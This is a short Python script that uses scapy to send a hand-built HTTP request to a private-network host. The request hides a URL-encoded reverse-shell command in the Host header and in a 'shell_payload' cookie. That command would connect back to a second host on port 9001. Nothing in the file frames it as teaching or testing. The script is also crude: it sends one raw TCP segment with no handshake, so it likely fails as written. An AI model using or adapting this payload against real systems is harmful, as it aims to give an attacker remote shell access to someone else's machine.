from scapy.all import *

target_ip = "192.168.50.210"
target_port = 80

reverse_shell_payload = b'sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.50.224%2F9001%200%3E%261'

packet = IP(dst=target_ip)/TCP(dport=target_port)/(
    b"GET /index.html HTTP/1.1\r\n" +
    b"Host: sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.50.224%2F9001%200%3E%261\r\n" +
    b"Cookie: sessionid=1234; shell_payload=" + reverse_shell_payload + b"\r\n" +
    b"\r\n"
)

send(packet)
